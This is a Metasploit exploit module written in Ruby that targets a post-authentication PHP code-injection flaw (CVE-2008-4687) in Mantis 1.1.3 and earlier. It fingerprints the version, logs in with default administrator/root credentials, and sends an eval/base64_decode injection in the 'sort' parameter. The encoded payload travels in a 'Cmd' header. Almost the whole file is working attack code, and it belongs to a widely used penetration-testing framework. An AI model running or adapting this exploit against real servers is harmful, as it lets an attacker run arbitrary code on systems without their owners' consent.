# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Mantis manage_proj_page PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        Mantis v1.1.3 and earlier are vulnerable to a post-authentication Remote
        Code Execution vulnerability in the sort parameter of the
        manage_proj_page.php page.
      },
      &#039;Author&#039;         => [
        &#039;EgiX&#039;,           # Exploit-DB Entry Author
        &#039;Lars Sorenson&#039;   # MSF module author
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;6768&#039;],
          [&#039;CVE&#039;, &#039;2008-4687&#039;],
        ],
       &#039;Privileged&#039; => false,
       &#039;Platform&#039;   => [&#039;php&#039;],
       &#039;Arch&#039;       => ARCH_PHP,
       &#039;Targets&#039; =>
          [
            [ &#039;Mantis <= 1.1.3&#039;, { } ],
          ],
      &#039;DisclosureDate&#039; => &#039;Oct 16, 2008&#039;,
      &#039;DefaultTarget&#039; => 0))
     register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the Mantis installation&#039;, &#039;/mantisbt/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to log in as&#039;, &#039;administrator&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to log in with&#039;, &#039;root&#039;]),
      ])
  end

  def check
    vprint_status(&#039;Checking Mantis version ...&#039;)
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;login_page.php&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })

    unless res
      vprint_error(&#039;Connection to host failed!&#039;)
      return CheckCode::Unknown
    end

    unless res.body =~ /Mantis ([0-9]+\.[0-9]+\.[0-9]+)/
      vprint_error(&#039;Cannot determine Mantis version!&#039;)
      return CheckCode::Unknown
    end

    version = Gem::Version.new(Regexp.last_match[1])

    vprint_status("Mantis version #{version} detected")

    if res.code == 200 && version <= Gem::Version.new(&#039;1.1.3&#039;)
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def login
    vprint_status("Logging in as #{datastore[&#039;username&#039;]}:#{datastore[&#039;password&#039;]} ... ")
    res = send_request_cgi({
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;login_page.php&#039;),
    })
    unless res
      fail_with(Failure::Unreachable, &#039;Cannot access host to log in!&#039;)
    end

    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;login.php&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;username&#039;: datastore[&#039;username&#039;],
        &#039;password&#039;: datastore[&#039;password&#039;],
      },
      &#039;cookie&#039;=> "PHPSESSID=#{res.get_cookies}"
    })
    unless res
      fail_with(Failure::Unknown, &#039;Cannot access host to log in!&#039;)
    end

    fail_with(Failure::Unreachable, &#039;Login failed!&#039;) unless res.code == 302
    fail_with(Failure::NoAccess, &#039;Wrong credentials!&#039;) if res.redirection.to_s.include?(&#039;login_page.php&#039;)

    store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
    res.get_cookies
  end

  def exploit
    fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable!&#039;) unless check == CheckCode::Appears

    cookie = login
    vprint_status(&#039;Sending payload ...&#039;)
    payload_b64 = Rex::Text.encode_base64(payload.encoded)
    data = {
      &#039;sort&#039; => "&#039;]);}error_reporting(0);print(_code_);eval(base64_decode($_SERVER[HTTP_CMD]));die();#",
    }
    send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;manage_proj_page.php&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => data,
      &#039;headers&#039; => {
        &#039;Connection&#039;: &#039;close&#039;,
        &#039;Cookie&#039;: cookie.to_s,
        &#039;Cmd&#039;: payload_b64
      }
    })
  end
end

